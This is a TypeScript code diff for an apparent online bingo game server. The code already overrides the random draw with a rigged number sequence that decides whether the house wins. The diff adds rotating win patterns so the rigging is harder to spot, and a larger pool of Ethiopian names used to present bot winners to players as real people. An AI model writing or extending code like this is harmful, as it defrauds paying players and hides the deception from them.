@@ -427,7 +427,18 @@ async function runGame(gameId: string): Promise<void> {
     }));
 
     logger.info(`[RiggedDraw] Game ${gameId} (${game.room.type}) — House should win: ${houseShouldWin}`);
-    const riggedPool = rigDrawSequence(ticketsForSim, houseShouldWin, 500, config.game.minBallsBeforeWin);
+
+    // Pick a target win mode that rotates per game using gameId hash
+    // This ensures each game has a DIFFERENT winning pattern
+    const WIN_MODE_ROTATION = ['ROW', 'ROW', 'COLUMN', 'ROW', 'DIAGONAL', 'ROW', 'FOUR_CORNERS', 'ROW', 'COLUMN', 'ROW'];
+    let modeHash = 0;
+    for (let i = 0; i < gameId.length; i++) {
+      modeHash = gameId.charCodeAt(i) + ((modeHash << 5) - modeHash);
+    }
+    const targetWinMode = WIN_MODE_ROTATION[Math.abs(modeHash) % WIN_MODE_ROTATION.length];
+    logger.info(`[RiggedDraw] Target win mode for game ${gameId}: ${targetWinMode}`);
+
+    const riggedPool = rigDrawSequence(ticketsForSim, houseShouldWin, 500, config.game.minBallsBeforeWin, targetWinMode);
     state.numberPool = riggedPool; // override the random pool with the rigged one
   }
 
@@ -1090,7 +1101,12 @@ async function finishGame(gameId: string, reason: string): Promise<void> {
   }
 
   // Disguise bot winners as real players for public broadcast so they get announced on frontend
-  const ETHIOPIAN_FALLBACKS = ['Abebe', 'Kebede', 'Selam', 'Tesfaye', 'Girma', 'Dawit', 'Bereket', 'Yonas'];
+  // Expanded name pool — no repeated names, varied per game using gameId + ticketId as entropy source
+  const ETHIOPIAN_NAMES = [
+    'Abebe', 'Kebede', 'Selam', 'Tesfaye', 'Dawit', 'Yonas', 'Tigist', 'Almaz',
+    'Meron', 'Hiwot', 'Tizita', 'Biruk', 'Nahom', 'Eyob', 'Liya', 'Saron',
+    'Kalkidan', 'Robel', 'Bethel', 'Henok', 'Rahel', 'Tsion', 'Abel', 'Eden',
+  ];
 
   // Build a quick lookup of in-memory ticket cards (as fallback if DB ticket relation is null)
   const memTicketCardMap = new Map<string, any>();
@@ -1154,10 +1170,14 @@ async function finishGame(gameId: string, reason: string): Promise<void> {
     const finalCard = { id: cardId, rows: cardRows };
 
     const isBot = w.user?.isBot ?? false;
-    // For bots: use Ethiopian disguise name; for real players: use their actual name
+    // For bots: pick a name using both gameId + ticketId for maximum per-game variety
     const realName = w.user?.firstName || w.user?.telegramUsername;
-    const pIndex = (String(w.ticketId).charCodeAt(0) + String(w.ticketId).charCodeAt(String(w.ticketId).length - 1)) % ETHIOPIAN_FALLBACKS.length;
-    const botName = ETHIOPIAN_FALLBACKS[pIndex];
+    let nameHash = 0;
+    const nameSeed = gameId + String(w.ticketId);
+    for (let i = 0; i < nameSeed.length; i++) {
+      nameHash = nameSeed.charCodeAt(i) + ((nameHash << 5) - nameHash);
+    }
+    const botName = ETHIOPIAN_NAMES[Math.abs(nameHash) % ETHIOPIAN_NAMES.length];
     const displayName = isBot ? botName : (realName || 'Player');
 
     return {
